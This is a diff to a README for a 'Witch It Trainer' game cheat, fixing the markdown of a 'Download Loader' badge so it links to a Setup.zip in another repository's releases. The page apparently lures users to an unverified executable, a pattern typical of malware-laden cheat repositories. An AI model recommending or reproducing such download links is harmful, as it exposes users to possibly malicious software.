@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Witch It Trainer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Witch-It-Trainer` · Updated: 2026-10-26
 
 **Tags:** `witch-it` `multiplayer` `hide-and-seek` `party`
+
 
